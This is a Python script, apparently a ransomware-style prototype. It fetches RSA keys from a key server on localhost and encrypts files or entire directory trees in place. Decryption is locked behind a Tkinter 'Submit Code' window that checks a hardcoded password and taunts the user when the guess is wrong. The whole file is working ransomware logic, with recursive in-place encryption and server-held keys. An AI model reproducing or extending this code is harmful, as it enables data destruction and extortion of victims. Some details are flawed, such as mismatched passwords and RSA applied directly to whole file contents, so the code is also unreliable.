from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from tkinter import *
import os
import requests

def load_private_key(key_content):
    private_key = serialization.load_pem_private_key(
        key_content,
        password=None
    )
    return private_key

def load_public_key(key_content):
    public_key = serialization.load_pem_public_key(
        key_content
    )
    return public_key

def fetch_key_from_url(key_url):
    response = requests.get(key_url)
    if response.status_code == 200:
        return response.content
    else:
        raise ValueError(f"Failed to fetch key: {response.status_code}")
# Load the keys
pkey_url="http://127.0.0.1:8000/key"
pubkey_url="http://127.0.0.1:8000/pubkey"
privkey = fetch_key_from_url(pkey_url)
pubkey = fetch_key_from_url(pubkey_url)

private_key = load_private_key(privkey)
public_key = load_public_key(pubkey)

def encrypt_file(file, public_key):

	with open(file, 'rb') as f:
		original = f.read()
	encrypted_data = public_key.encrypt(
        original,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
	# encrypting the file
	# encrypted = fernet.encrypt(original)
	 
	# opening the file in write mode and
	# writing the encrypted data
	with open(file, 'wb') as encrypted_file:
		encrypted_file.write(encrypted_data)

def decrypt_file(file, private_key):
	# opening the encrypted file
	with open(file, 'rb') as enc_file:
		encrypted = enc_file.read()
	 
	decrypted_data = private_key.decrypt(
        encrypted,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
	# decrypting the file
	# decrypted = fernet.decrypt(encrypted)
	 
	# opening the file in write mode and
	# writing the decrypted data
	with open(file, 'wb') as dec_file:
		dec_file.write(decrypted_data)
def submit():
	global keygiven
	keygiven=entry.get()
	window.destroy()
	

# user=input("Would you like to generate a new key? [Y]es or [N]o:  ")
# if user.lower()=="y":
# 	key = Fernet.generate_key()
# 	# string the key in a file
# 	with open('/dev/shm/filekey.key', 'wb') as filekey:
#    		filekey.write(key)

# else:
# 	# opening the key
# 	with open('/dev/shm/filekey.key', 'rb') as filekey:
# 		key = filekey.read()
def encrypt_directory(directory_path):
	for root, dirs, files in os.walk(directory_path):
		for file in files:
			file_path = os.path.join(root, file)
			encrypt_file(file_path, public_key)
def decrypt_directory(directory_path):
	for root, dirs, files in os.walk(directory_path):
		for file in files:
			file_path = os.path.join(root, file)
			decrypt_file(file_path, private_key)
 
# with open('/dev/shm/filekey.key', 'rb') as filekey:
#  	key = filekey.read()


# # using the generated key
# fernet = Fernet(key)
# print("Current key we are using: "+ str(key.decode()))
user=input("Would you like to encrypt/decrypt a [d]irectory or [f]ile:  ")
if user.lower()=="f":
	user=input("Would you like to [e]ncrypt or [d]ecrypt:  ")
	if user.lower()=="e":
		user=input("Please enter the file name:  ").strip()
		encrypt_file(user, public_key)
		print("Done.")
	else:
		window= Tk()
		window.geometry("700x350")
		submit = Button(window, text="Submit Code", command=submit)
		submit.pack(side = TOP)
		entry=Entry()
		entry.config(font=('Ink Free', 50))
		entry.config(width=20)
		entry.pack()
		window.mainloop()
		if keygiven.strip()=="SuperSecretPassword":
			user=input("Please enter the file name:  ").strip()
			decrypt_file(user, private_key)
			print("Done.")
		else:
			print("Wrong code, guess again moron.")
elif user.lower()=="d":
	user=input("Would you like to [e]ncrypt or [d]ecrypt:  ")
	if user.lower()=="e":
		user=input("Please enter the directory path:  ").strip()
		encrypt_directory(user)
		print("Done.")
	else:
		window= Tk()
		window.geometry("700x350")
		submit = Button(window, text="Submit Code", command=submit)
		submit.pack(side = TOP)
		entry=Entry()
		entry.config(font=('Ink Free', 50))
		entry.config(width=20)
		entry.pack()
		window.mainloop()
		if keygiven.strip()=="SuperSecurePassword":
			user=input("Please enter the directory path:  ").strip()
			decrypt_directory(user)
			print("Done.")
		else:
			print("Wrong code, guess again moron.")


